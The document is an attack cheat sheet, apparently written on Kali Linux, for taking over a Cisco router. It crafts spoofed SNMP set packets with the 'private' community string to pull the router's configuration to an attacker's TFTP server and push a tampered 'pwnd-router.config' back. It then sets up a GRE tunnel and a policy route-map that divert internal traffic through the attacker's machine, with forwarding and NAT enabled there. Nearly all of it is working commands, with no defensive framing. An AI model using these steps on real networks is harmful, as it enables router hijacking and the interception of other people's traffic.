|GRAB CLEAN ROUTER CONFIG FROM ROUTER|
packet =IP(dst="ROUTER IP ",src=" FAKE IP ")/UDP(sport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbin(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55.TFTP SERVER IP"),value="pwnd-router.config")]))



|UPLOAD PWNED ROUTER CONFIG TO ROUTER|
a =IP(dst="ROUTER IP",src=" FAKE IP ")/UDP(dport=161)/SNMP(community="private",PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.53. TFTP SERVER IP"),value="pwnd-router.config")]))



DIFFERENCE 55 AND 53

55 =DOWNLOAD
53 =UPLOAD

#KALI START TFTP
service atftpd start
default directory /srv/http



#ADD NEW TUNNEL INTERFACE 
interface Tunnel0
 ip address 172.16.0.1 255.255.255.0
 tunnel source FastEthernet0/0
 tunnel destination 192.168.30.10

#ROUTING TABLE
#102 i guess is rules
route-map divert permit 10
 match ip address 102
 set ip next-hop 172.16.0.3


interface FastEthernet1/0
 ip address 10.200.0.254 255.255.255.0
 ip nat inside
 <add this new line>ip policy route-map divert<add this new line>
 duplex auto
 speed auto



# KALI LINUX SET NEW INTERFACE 
modprobe ip_gre
iptunnel add mynet mode gre remote <ROUTER IP> local <KALI IP> ttl 255
ip addr add 172.16.0.3/24 dev mynet
route add -net 172.16.0.0 netmask 255.255.255.0 dev mynet
ifconfig mynet up
route add -net 10.200.0.0 netmask 255.255.255.0 gw 172.16.0.1


# KALI ACCEPT IP FORWARDING
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface mynet -j ACCEPT
